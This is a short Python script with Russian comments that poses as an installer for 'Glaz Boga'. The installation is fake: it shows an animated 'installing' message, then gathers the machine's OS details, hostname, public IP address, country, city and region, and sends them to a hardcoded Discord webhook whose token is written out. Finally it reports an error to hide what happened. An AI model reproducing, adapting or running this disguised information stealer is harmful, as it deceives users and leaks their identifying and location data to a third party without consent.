import time
import platform
import json
import requests
from discord_webhook import DiscordWebhook, DiscordEmbed

# Прямой URL вебхука
WEBHOOK_URL = 'https://discord.com/api/webhooks/1274044779839225876/r9Sm7C2wCgBi7U9P2NC1A9WiIdPvZLBiElm8voCH6Ph-kvEDSNpZPn_8k-mYsJRwFf7i'

# Имитация процесса установки с отображением текста и эмодзи
def display_installation_message():
    steps = ["Glaz Boga is Installing 🔍", "Glaz Boga is Installing 🛠️", "Glaz Boga is Installing ⏳"]
    for i in range(3):
        for step in steps:
            print(step, end="\r")
            time.sleep(0.5)

# Сбор системных данных
def collect_system_data():
    data = {
        "🖥️ Система": platform.system(),
        "🖥️ Имя узла": platform.node(),
        "🛠️ Релиз": platform.release(),
        "🔧 Версия": platform.version(),
        "💻 Машина": platform.machine(),
        "⚙️ Процессор": platform.processor()
    }
    return data

# pip
def get_ip_and_location():
    try:
        response = requests.get("https://ipinfo.io")
        if response.status_code == 200:
            ip_info = response.json()
            return {
                "🌐 IP-адрес": ip_info.get("ip"),
                "🏳️ Страна": ip_info.get("country"),
                "🏙️ Город": ip_info.get("city"),
                "🗺️ Регион": ip_info.get("region"),
            }
        else:
            return {"🌐 IP-адрес": "Неизвестно", "🏳️ Страна": "Неизвестно"}
    except Exception as e:
        print(f"Ошибка при получении IP: {e}")
        return {"🌐 IP-адрес": "Неизвестно", "🏳️ Страна": "Неизвестно"}

# pip
def send_data_to_discord(data):
    try:
        # Ф
        webhook = DiscordWebhook(url=WEBHOOK_URL, username="Системное сообщение", avatar_url=r"https://media.discordapp.net/attachments/1258001563880788039/1269594103126167562/d9f2786116b9f9b8109141cdc3be4580.jpg?ex=66c07326&is=66bf21a6&hm=3e065d8460135dab6a769364dab51610c8bd6e57fca823a9c4f4838d8035906e&")
        description = "\n".join([f"{key}: {value}" for key, value in data.items()])
        embed = DiscordEmbed(title="💾 Данные системы", description=f"```\n{description}\n```", color='000000')
        embed.set_timestamp()
        webhook.add_embed(embed)
        webhook.execute()
        print("installing status - error")
    except Exception as e:
        print(f"ошибка- перезапустите скрипт: {e}")

# Основная логика скрипта
def main():
    display_installation_message()  # Имитация установки
    system_data = collect_system_data()  # Сбор данных
    ip_location_data = get_ip_and_location()  # Получение IP и страны
    combined_data = {**system_data, **ip_location_data}  # установка глаза бога
    send_data_to_discord(combined_data)  # родключение к базам данных

if __name__ == "__main__":
    main()
